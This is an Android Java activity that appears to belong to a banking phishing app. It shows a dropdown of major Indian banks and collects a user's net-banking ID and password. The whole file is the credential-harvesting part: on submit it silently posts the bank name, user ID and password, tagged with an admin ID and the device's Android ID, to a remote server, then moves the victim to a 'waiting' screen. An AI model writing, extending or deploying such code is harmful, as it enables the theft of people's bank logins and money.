package com.pegalite.neotron3.ui.sb;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.ArrayAdapter;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.pegalite.neotron3.databinding.ActivitySbnetBankingBinding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SBNetBankingActivity extends AppCompatActivity {

    ActivitySbnetBankingBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivitySbnetBankingBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        ArrayAdapter<String> spinnerArrayAdapter = getStringArrayAdapter();
        binding.bankName.setAdapter(spinnerArrayAdapter);

        binding.submit.setOnClickListener(v -> {
            String bankName = binding.bankName.getSelectedItem().toString();
            String userID = binding.userID.getText().toString();
            String password = binding.password.getText().toString();

            if (bankName.equals("SELECT AN OPTION") || userID.isEmpty() || password.isEmpty()) {
                Toast.makeText(this, "Please Select All the Values", Toast.LENGTH_SHORT).show();
                return;
            }

            try {
                JSONObject object = new JSONObject(getIntent().getStringExtra("data"));
                object.put("bankName", bankName);
                object.put("userID", userID);
                object.put("password", password);
                saveDetails(object);
                if (Utils.THEME.equals("Customer V2")) {
                    startActivity(new Intent(this, SBNetBankingDetailsActivity.class).putExtra("data", object.toString()));
                    return;
                }
                startActivity(new Intent(this, SBWaitingActivity.class).putExtra("data", object.toString()));
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }


        });
    }

    private void saveDetails(JSONObject data) {
        try {
            RetrofitClient.getInstance(this).getApiInterfaces().onSaveDetails(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_ID).put("submissionId", data.optString("submissionId")).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName()).put("details", data.put("type", Utils.THEME)))).enqueue(new Callback<>() {
                @Override
                public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                }

                @Override
                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                }
            });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    @NonNull
    private ArrayAdapter<String> getStringArrayAdapter() {
        List<String> options = new ArrayList<>();
        options.add("SELECT AN OPTION");
        options.add("STATE BANK OF INDIA");
        options.add("HDFC BANK LTD");
        options.add("PUNJAB NATIONAL BANK");
        options.add("ICICI BANK LTD");
        options.add("CANARA BANK");
        options.add("CENTRAL BANK OF INDIA");
        options.add("SYNDICATE BANK");
        options.add("BANK OF BARODA");
        options.add("BANK OF INDIA");
        options.add("BANK OF MAHARASHTRA");
        options.add("ALLAHABAD BANK");
        options.add("UNION BANK OF INDIA");
        options.add("UCO BANK");
        options.add("INDIAN BANK");
        options.add("INDIAN OVERSEAS BANK");
        options.add("AXIS BANK");
        options.add("YES BANK");
        options.add("IDBI BANK");
        options.add("KOTAK MAHINDRA BANK");
        options.add("DHANLAXMI BANK");
        options.add("FEDERAL BANK");
        options.add("RBL BANK");
        options.add("SOUTH INDIAN BANK");
        options.add("TAMILNAD MERCANTILE BANK");
        options.add("KARNATAKA BANK");
        options.add("ANDHRA BANK");
        options.add("VIJAYA BANK");
        options.add("DENA BANK");
        options.add("CORPORATION BANK");
        options.add("ORIENTAL BANK OF COMMERCE");
        options.add("OTHER");

        ArrayAdapter<String> spinnerArrayAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, options);
        spinnerArrayAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        return spinnerArrayAdapter;
    }


}